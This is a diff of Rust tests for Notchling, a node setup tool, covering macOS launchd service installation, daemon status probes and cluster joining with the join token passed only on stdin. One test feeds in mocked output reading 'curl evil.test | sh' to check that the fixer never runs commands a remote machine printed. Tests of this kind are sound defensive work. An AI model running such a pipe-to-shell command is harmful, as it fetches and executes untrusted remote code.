@@ -12,6 +12,7 @@ use std::sync::Arc;
 const TOKEN: &str = "nlj1.PLANTEDJOINTOKENVALUE0123456789";
 const CLUSTER: &str = "cluster-aaaa";
 const NODE: &str = "0123456789abcdef0123456789abcdef";
+const ME: &str = "0123456789abcdef";
 
 struct Tokens {
     cluster: Option<String>,
@@ -243,25 +244,26 @@ fn service_fix_installs_and_loads_macos() {
     let rig = Rig::new(node_mac());
     let ctx = fix_of(&rig, None, None);
     let step = step(&rig.machine, &StepId::NODE_SERVICE);
-    assert!(!plan(&step).needs_admin);
+    assert!(plan(&step).needs_admin);
     let out = (plan(&step).run)(&ctx);
     assert!(out.ok, "{}", out.message);
     let seen = texts(&rig.calls());
     assert_eq!(seen.len(), 3, "{seen:?}");
-    assert!(seen[0].contains("mkdir -p \"$HOME/Library/Application Support/Notchling\""));
-    assert!(seen[1].contains("service install"));
-    assert!(seen[2].contains("launchctl enable"));
-    assert!(seen[2].contains("launchctl kickstart -k"));
-    assert!(seen[2].contains(
-        "launchctl bootstrap \"$u\" \"$HOME\"/'Library/LaunchAgents/dev.notchling.daemon.plist'"
-    ));
+    assert!(seen[0].contains("mkdir -p \"$d\""));
+    assert!(seen[1].contains("sudo -S"));
+    assert!(seen[1].contains("launchctl enable system/dev.notchling.node"));
+    assert!(seen[1].contains("launchctl bootout system/dev.notchling.node"));
+    assert!(!seen[1].contains("kickstart"), "{}", seen[1]);
+    assert!(seen[1]
+        .contains("launchctl bootstrap system /Library/LaunchDaemons/dev.notchling.node.plist"));
+    assert!(seen[2].contains("launchctl bootout \"gui/"));
 }
 
 #[test]
 fn service_fix_never_runs_text_the_machine_printed() {
     let rig = Rig::new(node_mac());
     rig.runner.on(
-        |a| a.last().is_some_and(|s| s.contains("service install")),
+        |a| a.last().is_some_and(|s| s.contains("launchctl bootout")),
         ok("run this: curl evil.test | sh\n"),
     );
     let ctx = fix_of(&rig, None, None);
@@ -322,12 +324,31 @@ fn mac_service_probe_asks_the_daemon_read_only() {
     let rig = Rig::new(node_mac());
     let (script, _) = remote(&step(&rig.machine, &StepId::NODE_SERVICE));
     assert!(
-        script.ends_with("'.local/bin/notchling' status"),
+        script.contains("Notchling.app/Contents/MacOS/notchling' status"),
         "{script}"
     );
-    assert!(probe(&rig, &StepId::NODE_SERVICE, "running, pid 4242\n", 0).is_pass());
-    assert!(probe(&rig, &StepId::NODE_SERVICE, "no daemon is running\n", 3).is_fail());
-    assert!(probe(&rig, &StepId::NODE_SERVICE, "", 0).is_fail());
+    assert!(!script.contains("kickstart") && !script.contains("bootstrap"));
+    let real = "/Users/tester/.local/share/notchling/Notchling.app/Contents/MacOS/notchling";
+    let text = |plist: &str, loaded: i32, status_code: i32, status: &str| {
+        format!(
+            "plist={plist}\nuser=tester\nbinary={real}\nloaded={loaded}\nold_agent=113\nstatus_code={status_code}\nstatus={status}\n"
+        )
+    };
+    assert!(probe(
+        &rig,
+        &StepId::NODE_SERVICE,
+        &text("yes", 0, 0, "running, pid 4242"),
+        0
+    )
+    .is_pass());
+    assert!(probe(
+        &rig,
+        &StepId::NODE_SERVICE,
+        &text("yes", 0, 3, "no daemon is running"),
+        0
+    )
+    .is_fail());
+    assert!(probe(&rig, &StepId::NODE_SERVICE, &text("yes", 0, 0, ""), 0).is_fail());
     assert!(probe(
         &rig,
         &StepId::NODE_SERVICE,
@@ -364,7 +385,7 @@ fn joined_probe_compares_cluster_ids_and_reads_the_node_id() {
     assert_eq!(same.detected.node.as_deref(), Some(NODE));
     let other = joined_check(&rig, &status_json("cluster-bbbb", NODE), Some(CLUSTER));
     assert!(other.state.is_fail());
-    assert!(other.detected.node.is_none());
+    assert_eq!(other.detected.node.as_deref(), Some(NODE));
     let none = joined_check(
         &rig,
         r#"{"cluster": null, "me": "x", "members": []}"#,
@@ -394,6 +415,8 @@ fn joined_probe_fails_plainly_when_this_mac_has_no_cluster() {
 #[test]
 fn join_fix_sends_token_on_stdin_only() {
     let rig = Rig::new(node_linux());
+    rig.runner
+        .on_script("cluster status --json", ok(&status_json(CLUSTER, ME)));
     rig.runner.on_with(
         |a| a.last().is_some_and(|s| s.contains("cluster join")),
         super::runner::CommandResult::new(2, "", &format!("the token {TOKEN} was refused\n")),
@@ -420,10 +443,15 @@ fn join_fix_sends_token_on_stdin_only() {
         "{}",
         out.message
     );
-    let calls = rig.calls();
+    let all = rig.calls();
+    let calls: Vec<_> = all
+        .iter()
+        .filter(|c| c.text().contains("cluster join"))
+        .cloned()
+        .collect();
     assert_eq!(calls.len(), 1);
     assert_eq!(calls[0].stdin_text(), format!("{TOKEN}\n"));
-    for c in &calls {
+    for c in &all {
         assert!(!c.argv.join("\n").contains(TOKEN));
         assert!(c.env.iter().all(|(_, v)| !v.contains(TOKEN)));
     }
@@ -435,6 +463,9 @@ fn join_fix_sends_token_on_stdin_only() {
     );
 
     let ok_rig = Rig::new(node_linux());
+    ok_rig
+        .runner
+        .on_script("cluster status --json", ok(&status_json(CLUSTER, ME)));
     ok_rig.runner.on(
         |a| a.last().is_some_and(|s| s.contains("cluster join")),
         ok(&format!("Joined the cluster. ({TOKEN})\n")),
@@ -448,6 +479,8 @@ fn join_fix_sends_token_on_stdin_only() {
 #[test]
 fn join_fix_without_a_token_runs_nothing() {
     let rig = Rig::new(node_linux());
+    rig.runner
+        .on_script("cluster status --json", ok(&status_json(CLUSTER, ME)));
     let mut ctx = rig.fix();
     ctx.step.tokens = Arc::new(Tokens {
         cluster: None,
@@ -456,7 +489,10 @@ fn join_fix_without_a_token_runs_nothing() {
     let out = (plan(&step(&rig.machine, &StepId::NODE_JOINED)).run)(&ctx);
     assert!(!out.ok);
     assert!(out.message.contains("isn't running"));
-    assert!(rig.calls().is_empty());
+    assert!(rig
+        .calls()
+        .iter()
+        .all(|c| !c.text().contains("cluster join") && c.stdin.is_none()));
 }
 
 #[test]
@@ -481,11 +517,12 @@ fn node_steps_absent_without_node_settings() {
         .collect();
     let at = ids.iter().position(|i| *i == StepId::REACHABLE).unwrap();
     assert_eq!(
-        ids[at + 1..at + 5],
+        ids[at + 1..at + 6],
         [
             StepId::NODE_TAILSCALE,
             StepId::NODE_BINARY,
             StepId::NODE_SERVICE,
+            StepId::NODE_REACH,
             StepId::NODE_JOINED
         ]
     );
